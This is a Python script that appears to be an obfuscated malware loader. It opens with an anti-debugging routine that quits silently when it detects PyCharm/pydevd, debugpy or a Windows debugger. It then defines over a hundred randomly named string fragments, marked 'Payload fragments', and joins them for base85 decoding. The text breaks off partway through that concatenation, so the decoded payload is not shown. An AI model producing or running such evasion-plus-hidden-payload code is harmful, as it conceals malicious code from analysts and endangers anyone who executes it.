#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cjBY8Mcg_BagHO = 'lRz?mG#E}xzg8YHE#JG_XYJGA1>T;iT)noe6O$g|dfK@h?~-T!Hg_;*QNqq6E}P)yKPD!oGTqrh'
_ccvbYQbRkb9Rla = 'WK^f0@{2BvD{;`&^dmvhSaj~XdxzqJV4qZZ<>rZ)U}$%>9OXFtO+15!nb$si<WWE7QRhc6>YFo*'
_cf6mPFKPehyFD8 = 'yM>!<_$R|13-d7<LTrQFv++|}#GmjQk8q9DIC>%3ES`<{j8irE`72WDEZmqzp4(sHx|{l0`W8Lo'
_cg91yuaM0AwBoP = 'YjI)M!-t3=>f6$GNj;uxA6HRazg8zm90v@OP`M?)`a7`w_H)glk&QPxFM}cBRN}_6a{MK@z+7Hh'
_clcnyYWhlwCdTO = 'Q;KiZvW5Ibu28l)TC7aY6Yy2J(}?{48Zu0?Tq;*~NY8{Gls$ch!_+b8^}RuI5&c7~i{KzI4_V%9'
_caxjGd_QCW_8aY = '-5i`S-}8j!gmCni@uTgcAJmZ?>>4g=tTrcfIp%3Z)7rc7dWhHC&NUgA>q2u9aFbsV6he@hA)$9O'
_cl3tcN2ve5gfE4 = '=FWzZ!SRsCV5E7=3yRW-_saU=KGnwZCksPq4aZYyiq1y;&(=t%GZwR|=@GK+%2Yt@alGN6<JySO'
_ci3mtcLQ6XQnnV = 'WUN8GSwK+V8fUQjNRDM&$W`q_qHXW2KFZfRSPj$#Imphn=z~y~*pl_jdRmdkT3!LbDZ`)dLOpL&'
_cdQWG80trojmuc = 'CtBHmv!`|bzdhzoL2vaSxMJ-*OX+vJBwBDH2S{W`6fzZnd6p2mnz{8%=D3H%%~zOi--^4Uuf+#J'
_crc_4i4M4a4SR1 = 'fn?e-)NZ){2F*ka{jcA*VuW@2lG1tBzhZTDzadf>0Eh-O@JP3rI%zm-U_|#rkf4*-$&6XQPs8|-'
_ctAv04owBVF7nw = 'F_Zyu*sbGgbev8sN@N$m>VY92Y*#7gHZ>vE_!4+{pk`HeknY1ly6pR0RHc*sFQyUihM02ylkv=X'
_cwzajmucMKklDD = 'v*6QAt~usm48uBnQ$-2*#DTth8bwZ)!dRJNXO5m1G}|<SLbZAmvog9+pSeXcok}_}Zxc0^f+6+e'
_ccWfoWfn3ZLyag = 'FZguoHiMEKFP5wz;(oNGoH*xadLV7>2V#nv_=n^u2Q2iZbwee$JBEwAKL|^W+tZrthfZD%3>iOq'
_cpU_c6CDFAcsXv = '$Wn|XIeA2v0!?i%5(3UXd>hI)_Sh?ONO-i4QcCfjIPZw^>8xFqQUU1T9qKJ;7`9?GtTA1dI(Rdn'
_cx0AcMedX_Lkyj = '15j)UANss2aeR70$e^0Xj&}^Ci9k5V4s?=%YmNI09JdCugP$!PR?d0`tbiEMU&Oy#9X18j&i9KQ'
_cuEvogAeiZyi6o = '((I=`sDkLl$nFQa|1Ci9A+BfNUvFMp+FnsPPxY9hBHEPjt6&6@_<<;~B{&Z_$4hz+C8X*M(6A#5'
_cl3xNYgnKuc_6N = 'U-E+QPRA7q&|uRmpDbaP04mbrY_tHb-viY=mmv_iGw;Z@4Y!z}T?;@iHfQye>3G6LST^K>&@WKT'
_cieNRDfeYexncy = '_IxWGc8WD}9RABWNsa=8^6vum8++L6pc8_pQB<)G3z--#p$AfH6Owap=Y?u=%`&L{3@)4_Hy*aV'
_c_FzcYqj8EiLSA = 'hg{Y?4ykwRFFb+ft^t#3L8VI?=r=jo-nh5phgk$Y1bxehQdLExr!LtTt=4cRS}#UGy8jn4&;Rt5'
_caULdvqK76Gr9g = 'kRJH|@uvoSgCc;xrEPqYA#OLMrw{Owy)eBl{+b2i8r9#yxp>;*_Sl?n#TYzSL_JBBCpV%%1)j%d'
_czmWLQIWwMHvXN = 'qF_GaQN|^YPY>eY3+doNookOBzc>HIlcYyQUzCO>esXSX=?5-TX~lhhg|u_Kk(3GOXV1;jAk%!J'
_cvVzoMPQAhkvHe = '<Lv^iLt`)9>#<RAiZZXo2eun}K?BN88WEA=yk9$>37KCOIT2KoDkdQRo;Z?oyDN)3!&cdl^r)zZ'
_cpPV8J9pxjh8Wq = '>ktPg!A^9$<pu+40|PR?mnW(25?b4>fNdgXR7GP!1+QL-%aff5EBAX=9eU@6I=a8)peu>{!B;JZ'
_ckptLSntB4gMJC = '1_Ko2Fn_GWf?HHtO`dP&?s8+OBE(C<w9-zxRSYwJc=3M8H)8gVk7G^8LA_4YYitiAY4$`LQ;8Cc'
_ceqYQUsbjGu61K = 'OyfrH#i6P1InQs*kVfRGSPyj;#njri%-}=C;)E0y_TG46CCV|IwUgr~(a>tlBx9p--W(EpwlI+H'
_cd_kTx4RGWO8rZ = 'DkrqClmmw(*Owc)TfyAm1nszX(g+C@w7R*!DIxRF@_(t3K;q4q95ZJG<orCs-;WN-_3y<h+yt6&'
_cqErm4DdzaOFCi = '<(JZX>k1*=1{&#Nxuy*aTe5>A#j`=Zlf9#LR^->Ydb-t(9Z%JNAmO@-E;JvkT9)6Yvm)4Ffse42'
_cmlPLGRUZQ3jLt = 'y>}-~@xk(4<eb!EldXRgZ8=Buw6DIvOy^9BT+6CGM?ufb1OO?b$_Ymu`&fwKe$2&GMJE%I4Y0m4'
_couV_KNQfqvF6D = 'tprlMQi(y|A^(ON)wGwo&(x)qOQ%wknI>`x5}+#to#VIfk}qj8y7@ij%u~DsTt27ghqhy<_Ikpy'
_cdDU5Hzzy61e27 = 'i)N(R-xyxJviH=Fx1?N&#nO3nvvqkgTMKYVR|zU-xf1D*##Z*f>v-8F!p$FpIFeO6md|XxnSr}('
_chIxf7srMLNr2z = '`nS36e3`O~p1o^5brf3;z|6DqX$J!BIN0&O(^+>m))sH(*XjzN%u5u7>DJr~Ec2PHg)SUqx%C6f'
_cedbmWxY8nbJUj = '{ze~rIgh$auL!q<WK?-vyNG1WP9v0!;xikUsUlsK#oAWYnzI@SlSO|N35pif<_WXojPkR^-Wb!e'
_cdcyY5V5uRQyY_ = 'D@0yDY#TLl_vrNd(L7&2J@Qtx^y&lu{X`e-;Mj7$?8dQfWfarwkZw^-`#thQtu-CPTh?7Jh&cQY'
_ck3jCaojSff_9K = 'qJ@%%a<q<~b`@J-e{)xP!nr!+e{&U7@o_FT3@){Pmgwx{!SQ|Rvaa(_xYW*ed0sw1^MT4=JO&uU'
_ccxtOPKVa_w7cw = 'iA9hwDNX+qlhkb%Z}JQ+%BTaK5lL4cq>7<<dE=#Hz=CX(yHY~;U30J7X9Okh$<QNvm^|xsSCuiq'
_crT_YLiVaSfYZ4 = '!{sLYF4Z%b%){mMOiON@YujPdnGt4Kz~x8WQOAZ#p(F1@I`I;)mN^w+iCkTfCu(S?!VLq<lI-(Y'
_cgHwmxJnjYRRZ8 = 'Q4*GslxS#o5j@dQfbhZ`k9}eeh#JR!AwN9jT;w1>@ld?Xupd!O7n0aGD~$60Gb_sm*pKFYdVy&B'
_c_K5XmgPNvS5_c = 'J(HaPpFATwf<(rR&>xq1pw3}7*k@aFc}1_ka(!@9hp6o$t_bdNqLYRs-Mj(lL&^v*Mg;Yl<QP4q'
_cf2RQlzYtoMtbh = '&<y3)VZcDbBdv=HH0jq$>-^K|!95~S5Xl<j$-{~}+eoANR%3L&A7w=-#V<wKhvLLB4eM#MIJW7N'
_caTvqpE7nJnbzL = 'kb#n!oK_@I<fjOPQhc6tfKBkjXE|}ZQTL^n`r~c*J1|UYX~2jr_eF}ApOQ@GcZ5logo5ukQ`_+E'
_cvJmu0ucJyGZls = 'S3u)6Io?I}x$;aGIJ8FH@YcuGb?05f9wkO8VGI$d4b5&9k%wDJ;S^*(EDxF8s+IGjO=m)RWd38W'
_cdbGCI9fiL4ciy = '=49MtK`o1fAgBtRw7^aw;>wD3h5|GupIe}Ya*=Cb+Z13CfP7n>gG)%ln`|TPlay%l%rd%!{vFwj'
_clwGDX1iRvXMXb = 'NzbR3De;^ZF!<zNJ<4~f4{PA%I@P||&N&ML1r84A(ZwMfLRtQim`MmXO7}<o6JBfuz=ohS9fES)'
_cpJUCmBgE0Swac = '@#9W<(`}0e%(Aol51iP3R+0@s5rGgcFV-LqM@j3u<eL4*foSh3D?E!D<)J5jNY9QATK3GH)kw+;'
_crWE92CdwD7NM1 = 'Pk`LMY@rb}aJ(Zj3A4B%@_LMyp)rG{w7tTUdeTuZ!LnW6QmWM%o+PWqKY6;XHOWlx9gF4V;UwH2'
_cg_qWvi3LMNW0J = 'o|Ta5Vsj^4zH@)|Xl@aKy);f|b<-yrHG?RftFyH<_YRYl_*>dGMZ-_Q&m^@Bdj}ppMIW9HG7|QL'
_cjXE13vvFbFGAp = '9pUSAr*ewD7ekR2ZgOvx#(}BVtw6Qjp^Blfz0G&(X^vQ#)x%ARhXlY}$=dK7n!mnCxSzKC3<Y8%'
_chm4Cz3zOlwPYc = '+}#Nk8a<1T`DNxa3TtpgsGyq(@pJf2<#yNn^a}#R3vUZ1X6|Ctb5^=?z41}4JpVRbh3&Z&<Pa=A'
_cwRc1glMwwcAZU = '#(@;T0q_4lKqtp8-LwrJH{f9Y)$bT0u$+)RLUpKA`^;NY+kZpN>@{fJq^kbd{UG39C8~(j)5N;!'
_c_2D5HewqHx3ML = 'CRyPDLSj?}?}_{QKjbhdQ3v%LT1Bo9TQsuznd@0E43Qe0igtzn35)Lw{9p_P$%#5E@O`?h<qpfi'
_clx1DtZpviq6Gs = 'h7Rpcn$1qN8HCE?!U{G7#SuSc(1Jm96|#BMl>>8-dh;XUo3^M<-J&KN?bHQ5s##XATaS1~0#9fs'
_c_Bb6p6lYQ6Eti = 'u<|B6@_&6sOv!pS^w_TeZ35K~L4`Qnb1`o`kB?UKsNZ9ZUeNG<);5OC1ible8psN~lM@#p7f%%h'
_clmdhI20Uyts8E = 'BjlpZ!%iMgA0mFmlT&2kHsik}lhXC_AlZO&Y4f_S->U$?xN*ICF*nKi_#P6K$2eVNQP)e!&?VZP'
_cbEiaBeIMd69HL = 'n_ZRPOcXBkR<mkv_H&B;cP}+1CBJ1CJOG!+<sgqw?&cmrE5K(KJF${6NSAiZdo=a2Q;zW}Fsb2|'
_cwxwRCJ5oEwO3V = 'jp+ma{6tbJUT26(qx!W27Wq|wY4=S4zTzv}nu*UI3lZD-flyRo2X@E7*snc>Jp;Kv9RTne7+o2n'
_cc4ZjV77SVBTx0 = 'o)bL><^}NzY&z*G<l7cHK@`WH+o~r|7_Wax$cSY>*eV7groLbBrAxCJKhWn=Uy_WZ_{5-LbgCuL'
_ccKZjbH7K53KrP = 'SZsSiGbxJEXeKxyc)M45(xLF;<I2O26hKM!NQ{wUnh)CuuLtWEoWw?~m(#9v8P;0Gdj+T`bxrVR'
_czQ_poE4O4SyGD = 'DO1#tS!T(T=Rip`b<z)yBAZgKXg}h`qYn}Z`;Ynrq~=8E#yt?ctMlv9Z6{85yq&0Z;qo@)n4SP)'
_ccKtTHDK0blU5R = 'HdY@pfGKP>fM_rEayc-v$8DH>dW!EG;?B-N$^9?1dyS&9?A;kH*7}m_{qS2m!2JNpj@_Xf4zf1Y'
_clP1SzvEV4Yk2X = 'q&Uvd4;L6w$uS|TLX!hMk-h$SyHlJO!L^0CtM-7}sXguYs`Dl#@3Up!AP1KSxP-gHP9tRbxbwKb'
_cv__Zy2AA_axL0 = 'tNZM#xSG`oT)QscI5T?(gKKkAtIm0-k6bnc?IcR&M_trJ@X6c*x<I--x%4&Fg)8@jK9v5koKA4i'
_cszqBZ5lhPXcqL = 'B~z`JA=x8#zfh0SzO*t88L}orG0kAqs^4z)KD3A7zDZ3nr<*B84p{S3YLkcms^}$A7xs}vM=Vc+'
_cgL59qzY4qjm6x = 't|xx&914mQyrjENPv_64Qz!J1=UmS7cZuM#K~2l+^}yqfyuvM_4K5xp^`%GmA8Ha@M1U^j<@CP!'
_chRkbueGjnIOoK = 'ZDy=X@NUb-LEjS>=5rZ2(3>ULBuz#_b$dnX{aW|{o%>MUVKVJ}h{S*ou03Gf4K#q+bB2&!V8QXk'
_crRIcmDJRI96iR = '<BxVT6d2>LEU5zObVz)6`U>ifJA@oe5Bq)T2pxb^N`cjoISHhwTVQhIEOMv1P23}?1gHX6=f)!Z'
_cngKvWC5OnHtx2 = 'JU+L7X9Zy(;$XVk`nE||5wEwFoA>xtV93`M>=MJ%^_08o)i({w+9z-^z0VC=bKRW#ob;WO+p^KB'
_caYo_qm8AeuHcW = 'SSJE8Fmyx^l+49vJ(HXhnVN?+=gX{ft>@gUt%aALTZo~?JGWz~At$ztNM(e)rI!s24r2NSQG}OV'
_cwryi2EK7k6Fl_ = 'Q-*xe$GCQyX@VqWp=@bk-H6%UX%a~MVHIsBIpt=8codksDm?0l(LVu-_+v`Zyt~+sYa6{MuC32?'
_ciUoEeeB9a3SEG = 'zuI@WcK<lgu$ss81}?SbjOXO<T$S>9b$y$yM)SPq!qgDkb0@G=yl8jgq<lS-+VF@*L0*br5wQGo'
_ctiVPwVe9vOJKK = 'ro6HCTk6+hw%ntm?KV1kc2H=2Ci;1U!$Cnyq7;gK&GHQAQA6m0+bglt-nDi~U)F23dP7oeCNvam'
_chSXFT8EDJ3O_c = 'llAv{={Hb*+I6kij1ZY2u1jYAhSTk8o}B#czp;;GbB=LC<~Z1l$xDz4oy4g!bKI7^I-HQwXxW#_'
_chC2zRUX0bgH95 = 'V+#T@X5oaX(|-WviYm&jXI6k06S96rJL~FH-=iN0hIc{EyKx2aUi~afG;qgNkOTu&YXqRYXu1pv'
_cejPGCQtsxt2bT = '%QRZ3?itwJb=13v+_is*E>yt(37^Z6X2D1?O1osZ{nank7xCqf*)oOx2h;1P7zoAZly={s;tb17'
_csWJj_LQuf2JKF = '40(yofQR<6^+~TZ5~lDvg`)B)M+Z66wy#Jp<`sLrg!c_y8SV@g7Ht;>UQL4Ze^yuke!XhDaX<Z3'
_cf287WXNKfVo5w = 'ra(DHU~%=-1(y3M-O?F}{5zkDQ)vUy`p#GOeF=aZZ-IynGfhDeXVp;kyUbs~eNKfa{du*!(#bmq'
_cj9CP2OyuVm46A = 'o5_l%FpP|`4$Ovb5)p1mS>z5<&z{9NvH7)#>JT$^-yO#L#f)ZgOTmU8sPTQ6nL@U;uIP*bi(wYs'
_cx7noOgHnWfpQt = 'pNjZX#(ogiDydA_%+>O5&iGOk5C}t(aG7HI${j_MD58=eV#Y@SUG8_|!M=i2fj60!w3@BCdy$i9'
_cipyXPW84AWB8v = 'q1o`}l>o0?$+yjrR-PWTQQ%>4_UGo0PjpU<cu%=+6wxLd1m3D^2{Cw;Fow}zU_b0%U^Q}XwY)py'
_clHep4lewvxgpe = 'POrmXW|<fXLn9<r%lzeBUQab@mgS4F4JURG-H+b>H`?n_rK?F4cPzEZX^fX1BP{WY60(nl|1aC~'
_cbmXW7CNHlUtWE = 'S4aZLKiZMbch15X+gowNKg6T%&8Kj(`XCE9(4{5T)T-!uy2cRh?3PlC0oXIluyd|`K5vNx__Yne'
_cs7qIoa6ltSbBF = ';nuJ}1^7b<&`$;?T^oHJI^&x0WTS;}Y@L}l5XnWTwqF>^o_Ds_+hvUUQwubsCq&U@n+)EDjDt;V'
_ckvyAktWgomZYs = 'z?u9=oTZ%;PMt`5+VivhrF1ZRR4{uM*M~Vi0d~z>O)=uacO$j*ggkdm&0mGyh<fJK^Bj2KTO=$!'
_ceg7g8w9MEzYv8 = '&v2?(dlC+<FCD?tSp>%9PV+X8)aFfoQJV9^*vZd6noe7gyNy(OK>-@Md}+(DTq;i4>xJW-gaQ3N'
_cvHZZ56ZanUD53 = 'a~D`43}j#Z12TRqyl7i=^q<*fM+!UTh<#ur^_61)x^3<89xV_;ChV2M!q%C5dRs{49=>oTEr#Cc'
_cbqqCflwAiWG7f = 'j=o1!r=Sfmo20LQF!dcXL3z~rX|TU@;#JDzWB?dREMQjxtLad$iR+&9Wyq{QOgIx=i@i$wEs0Eh'
_cgYSUV8pqBwQRZ = '8I=J3&kF>4W@QyekJ|Mv<X15t^QHzQLF(JgG=_t3YPne@9hxtcc2++A6d_l8EB)z5rSx+LmkS(B'
_csbWCqOM6H80p1 = 'z&I4OovA%r=2JBHU=!JrR-_*LO3zp6By%})%}dB+367?PYAB*(tU(t?RtS65jTR`27A*$Jo_J5;'
_clP6X_33lxhXZF = '*Y3dVm*8G<{ej(S-C7+3?Mi*8>U((Ws+66o0-8pPX30U=Y=&z_@dbtcS%PXCGn3z9mwC8OI8c(y'
_ccEwSS71EZa005 = 'T|vWHO0o9yZLa=v0I7`ju-e=fPDe0$2qIr}eHR0hV^<E(zd|d;P8yL{MVq%G&X-c<olg8p{Zb}y'
_cxmxrlDi2vmiqL = 'WGT}-e*;0Ux|te%bn%#nx(NTj5I#)BDhIerD#z>1lmpQo`_%Lih{E-Zl%ELS<MNibUKbR?qSROM'
_cxk8tbbv8uiIZS = '_^cQsYA6GcxHO?jo{BDsTkM27y6UPFG>Bg#>S}D52stJvRR&r83!LDXAUD=Xwu48<Yy^}*c3wuP'
_c_oXhgRnc9WFR5 = '<dcKy#bVsP9u|BDvr+DxO+hy3DWw?T1mBn^{$@X?;&m-nM8VbVRF=`@gsovJ=(-FvxN<d6npC<6'
_cjy6CIDt_KqSuZ = 'Ch(q-XW~`q6sYQoMY?aTV=%Db11t{h(s_ecY-j|O4|u_QA8SOI`_OUy!hJhez^CxKac|G?p_f0*'
_caunI8IF3YxMFi = 'mryF#({F$+wQ6KWokIa{JiOcse7w5j3KB?-K_##29dUULq=~9m*9|@kMTtJH{ag<i_x5a8$FRhu'
_csBg68xJ6ob5jb = '=u3(?Me>?(t$TZz)e|14c1$@)=s{c-(qHUS+3H%>MZKoZ=Buaz1Y-<1Vu7LS{pO*A__p`dQ!k!~'
_czVkcVP4vhQ7Ky = 'Xl;8<{{))oPEc6Q9$J5kp{rFiK&w|VYFqVJRcZtl$`M!kD|Yo?#34m)bWxrG#<_*D%zkQ^3TcfY'
_ckbvzjYz7g0yRi = '*dwBs4YX_TaVpSe8<t2NQOvlT&|4T;4~Jw=n6#3*Zt`4|>yx*PT^}sQhtH+}qZn1Nwe?z9gij)E'
_caiIfqjUoi4Iwp = '#NxA^5+DJj-Qx$yBV;l)tX<I;{RGq`D5zzAx)GL=9MA=O%wR8!GpCTFD|ZE$Ud$=G`F@uRKBM9|'
_cr7xsQ5JvWurS8 = '6rk><6|;=}Et)GsV%*w!T9c5Iznol9ShxoX2c9)(iwp<Rn4?ExIpQshs!ezpF_YJmKY7BMO{KZx'
_ctueQxzBPMQUb3 = '5L{opw`RI8G=Q9a?*0-Rx?VpcEVaPml16u(C@h}4DY$B9w>iS-2ZiNa7R!IJ!Cqb~Pj57UwXlB4'
_cjEl9FK5Sv5auQ = 'tz=93ASjT2Uol8BGR-q16w>~lK2{C1?{fyIObo6;WzGEuU)8<h24Th_S1Ak|mhI>ofBz9RqD=oi'
_cdoP81zKP8qrlY = '6NI3*LiIol{gc&f^GG$|UrvSvd@tgFA%)GBZDjfxiGDN?en{`Vo<aRED1~xDt&-|ggFnouWxqLr'
_ceo3koyC0N20M3 = ')*Yl-ARX?EWGfU4txs>L!|)g;C))R1I#G2XJ{<SGO55*s&RKd9pyFQZukELMdkhgfRKTs-d94&H'
_cdGUwNdJItdE8z = 'O3gE9G!in_5MK|2HGFE=Kj*+P2lnOwKKTh9>W9%6%vttUuX0Nrcn)@^yhXU<&S|weA~NI3`D&-='
_coswq0EzNmuL6f = '-U(1?U=QEOl;W)>w=x=%b_-%sI*!fAAjo<Fc(ME~4P4Tufu1-`%F!F%gg?@#<{)<%P~L%O^pDT?'
_ctvN8frG22CLvL = 'yI2KK{oD+KZ8R3FA`z;)M#H7oIphDYYO9;TzfOO>0W&OZg5~?Uj6bhZc4arT{SFvw_w?8xP$h@l'
_cqp0wAI7hvCgdO = 'dM>}>+DQR%&hzSRV^xq6tKZJ!^&x-8nJ@1WM0!1TyU2ph9y$SVHiYu7o9NWK`2g6^@shl+tirP@'
_cvifSQApmM0NSA = '3@dJXF}9cI_5j7ioEF(<s*f*FsQNGS{O$+ktaeLMYEEs@GDKB6T|DNy9~j(5$vR<Anm?~=#z2sq'
_cgHl4kYlRmYNfG = '3#To2jF9+2ADZVL%;~2U5TFc-M|2fm`!)^?Ccs*7p;jFBRp;tBBUfB|L7<|?jq_7aFGSwUPU4Rx'
_ckfzQucyJiar12 = 'Q5B>EFW0g|#EHWV2Z7R&`UHVV9aGHyzoyQ$aB~bEOUCJuax4)`ChOA+q0`GZy)OW0rC|9!xC@56'
_cqF0ZNHA3HcrzJ = 'I3G(oS|#-s)y{vCL2I?H9y6uwS}y(oB+(e)W+9s#bYl}ZcoY{HkM0icwpJa-nLNgu4VZ8!G2bv~'
_cggAC2H2kizrCh = '3P{-+80jdCn`4_2ns5kp{H@*K(YBE49X5HsomKa~50>O|MaqBG^$+<D?Jrky9_nD;STawqN1vov'
_cmkGKHhoSFuiIr = '8cvaMq#MwFsQ<)g=~pYJ!DXIrxk%<#i>F9DcI05Ifca8g<@v)~bgAnGEfeL0aO|gCfBNj9r0faY'
_cl4JCwmmGKc4Lb = 'K8b=XBbQnl-@rm`)zk#kI@(0X1q>SYebE-wD`9zF-I9mj97y|-gx~}Q%Edf?RQuDES7d@~yE^q_'
_chnml8SUcYz8qz = 'an3EmIM=_qw6{=atPrIQBq#R&1_IDmf}Q7fjvMw>I;)&XY|^l&4rw_x$y?o~8tUIC$EE2mGGNou'
_c_VWAkiOqAcUa7 = 'xq^X0%T4a4mbS>QPv+_KS2|<3l&}h`4Z?@DX+<Br%GLq<rsEKon!8Vn`^br|C67t4#ip}%Oa-!U'
_cymBCBhZzVxWcn = 's2q3TXF{Hg+-UBneQcp~H_~K^A;skSp)Q{R-;7fF6Gcr5CN}r~TDf(=)@qvi{d|?Kt$KYS_QZAd'
_cq0FB1UuIc7fJ8 = 'Wi3QpougW(rw{Lv+ko%SifQM<0DTn4!QWCVh5QP*gqbn`OKA0=sjS*|-2Oq&m1gw81&7A_n>+8x'
_cuRysUkVrTa5qQ = 'YTo(*-*&5ygux0QL$-2AnGsoYP;Rv<8VmD4Pm$i8Wxn1TvyW!9(=CerLSLK4mleml;k6w)Wo}K4'
_ceeIz1NZj7PXim = 'RS{avqIrq{-fI?W4#ATpCRDUZ?ebx`aq9M^mR|mpSFz1bIp_WvZ-cx>7Z||>8anqct)eZY3VU!?'
_c_ijLFDC_pZKdy = '#Gy!kGwavn?!+6qzF0l(W`|?_{yH`8n>NAry>HPhQM|L;3ZqH^$T;4y)hjHV33EYqb6~4@-yP@@'
_ctFYEszyaBzrq_ = '>*cB<`BK!K^Ih%=nc3}OrR@m{y*AN0gA~CkerS57{8060#5N-l((ER4RQ~IV&`4y32s3*2*&Pdm'
_chGxKfhBHTcVzg = 'wTUZ!wHWimRMw;>qa72eY|_D$8$KpCwiqPs4>hWjeA)m)Lv_Z4Ze@157LFJjajYw;kY^`Iwv>mS'
_czkKi7FAhcq6AI = 'L<LhyOcFclw$(kJ=Uz1`i)w}E4=$fZ31SEN*Sr}CAUT&GcpY-@v+ZJta$86VxB4P<*NS)@XgMrK'
_cx9QYuEA2Oi0Af = '-_pzpMt!r3)w+N_(co?tYr~%5*{ic_)xV{SsRlIR+cu5>M!Xx_M~wXdf6q>?xzd>X5*E1W88y!i'
_cs1jmvHV7giB5M = 'q-8AmrPaKbRp04C#As9^+BfUkQ}#N41wxwH61lIKid03Z2TmM(B+Uj;%0`4~NqDe3<l{u*5Sr`t'
_chmnQn7G8lHOr_ = 'aep1*@p$DmH0obb9!9Hy0Bg4fj3QEfjI_w>!R0CJ0Xg0)+7!f!b@nCKdkB+etzL2Cjp(N0%dn2%'
_cnQCkHclFakmg_ = '&UW6zj<S)~9Wr%C7SAflVU%~jw|#st2=(;&KCw&sl(r%pyPI03c;V#R2E2lm5zrE`4SYg(iX{fF'
_cxSGsVMRTQv8m4 = 'O%rX>0OXrvpg+z%y4WXMctzk>DfG?(H^#STAje)46pW;Ko>`dC@IiH1-S$W}Nfyfe5twojogy6|'
_cuV7iqHyqxzItu = 'Oxk3uODj`}a@4<6L*T}=%%feWVp+KtauaP#9DB55)Z?V%Ev(2LP(7GcW#LtG#QuKd@)6{o@A|70'
_cmVu5HnSCy9ubB = 'WFNpodyWE4rCx_$_8-tb>%y<FJ@Ny0uqU{V`lECSZiOs`hC9I#$N?1@z*}?t7&D$ZR^$jng)SYe'
_c_gIpI9iZgNFHm = 'B(E$-Yvg$itmX+(G$rx**Xh#76<-!N{#)QqcpF%O)MAvBD)ZQPDINNI4yQ&sZQZ?=?gpN9?gDQt'
_c_FFwLM5JofDBr = 'X@4)Xh021PK)mDDh)NKatd<MbtVLMBm<54~UbxgrH|B&}AFX$!P~~?Fjm=9aDvnQD0mLFNcgn50'
_cmPQeg_dcznbIW = 'M0UxR(ZNE!Gd^l3Js_ieL7V4{$Gk`r*uvZKxF8^Nh0SEf&-8S6E_Ubpq56NAz*NrSNqt;;u1|(s'
_ce6UPKtp0nWJ9N = 'XsH>E$ynZy0LEq5F(J4?t7t{D>mf1L6+KivVX+b}`@p=mTnhqrNgim&OQQ9sPGU>w445TZ6}RB='
_chWQoUt7ElLrCK = 'v0LMa_77fU<2c=W2*;?<`h|mvgw?=$o(})17jl~DEU6`i?1T'

_pal8mJPtpwJPxk = __import__('base64').b85decode(_cjBY8Mcg_BagHO + _ccvbYQbRkb9Rla + _cf6mPFKPehyFD8 + _cg91yuaM0AwBoP + _clcnyYWhlwCdTO + _caxjGd_QCW_8aY + _cl3tcN2ve5gfE4 + _ci3mtcLQ6XQnnV + _cdQWG80trojmuc + _crc_4i4M4a4SR1 + _ctAv04owBVF7nw + _cwzajmucMKklDD + _ccWfoWfn3ZLyag + _cpU_c6CDFAcsXv + _cx0AcMedX_Lkyj + _cuEvogAeiZyi6o + _cl3xNYgnKuc_6N + _cieNRDfeYexncy + _c_FzcYqj8EiLSA + _caULdvqK76Gr9g + _czmWLQIWwMHvXN + _cvVzoMPQAhkvHe + _cpPV8J9pxjh8Wq + _ckptLSntB4gMJC + _ceqYQUsbjGu61K + _cd_kTx4RGWO8rZ + _cqErm4DdzaOFCi + _cmlPLGRUZQ3jLt + _couV_KNQfqvF6D + _cdDU5Hzzy61e27 + _chIxf7srMLNr2z + _cedbmWxY8nbJUj + _cdcyY5V5uRQyY_ + _ck3jCaojSff_9K + _ccxtOPKVa_w7cw + _crT_YLiVaSfYZ4 + _cgHwmxJnjYRRZ8 + _c_K5XmgPNvS5_c + _cf2RQlzYtoMtbh + _caTvqpE7nJnbzL + _cvJmu0ucJyGZls + _cdbGCI9fiL4ciy + _clwGDX1iRvXMXb + _cpJUCmBgE0Swac + _crWE92CdwD7NM1 + _cg_qWvi3LMNW0J + _cjXE13vvFbFGAp + _chm4Cz3zOlwPYc + _cwRc1glMwwcAZU + _c_2D5HewqHx3ML + _clx1DtZpviq6Gs + _c_Bb6p6lYQ6Eti + _clmdhI20Uyts8E + _cbEiaBeIMd69HL + _cwxwRCJ5oEwO3V + _cc4ZjV77SVBTx0 + _ccKZjbH7K53KrP + _czQ_poE4O4SyGD + _ccKtTHDK0blU5R + _clP1SzvEV4Yk2X + _cv__Zy2AA_axL0 + _cszqBZ5lhPXcqL + _cgL59qzY4qjm6x + _chRkbueGjnIOoK + _crRIcmDJRI96iR + _cngKvWC5OnHtx2 + _caYo_qm8AeuHcW + _cwryi2EK7k6Fl_ + _ciUoEeeB9a3SEG + _ctiVPwVe9vOJKK + _chSXFT8EDJ3O_c + _chC2zRUX0bgH95 + _cejPGCQtsxt2bT + _csWJj_LQuf2JKF + _cf287WXNKfVo5w + _cj9CP2OyuVm46A + _cx7noOgHnWfpQt + _cipyXPW84AWB8v + _clHep4lewvxgpe + _cbmXW7CNHlUtWE + _cs7qIoa6ltSbBF + _ckvyAktWgomZYs + _ceg7g8w9MEzYv8 + _cvHZZ56ZanUD53 + _cbqqCflwAiWG7f + _cgYSUV8pqBwQRZ + _csbWCqOM6H80p1 + _clP6X_33lxhXZF + _ccEwSS71EZa005 + _cxmxrlDi2vmiqL + _cxk8tbbv8uiIZS + _c_oXhgRnc9WFR5 + _cjy6CIDt_KqSuZ + _caunI8IF3YxMFi + _csBg68xJ6ob5jb + _czVkcVP4vhQ7Ky + _ckbvzjYz7g0yRi + _caiIfqjUoi4Iwp + _cr7xsQ5JvWurS8 + _ctueQxzBPMQUb3 + _cjEl9FK5Sv5auQ + _cdoP81zKP8qrlY + _ceo3koyC0N20M3 + _cdGUwNdJItdE8z + _coswq0EzNmuL6f + _ctvN8frG22CLvL + _cqp0wAI7hvCgdO + 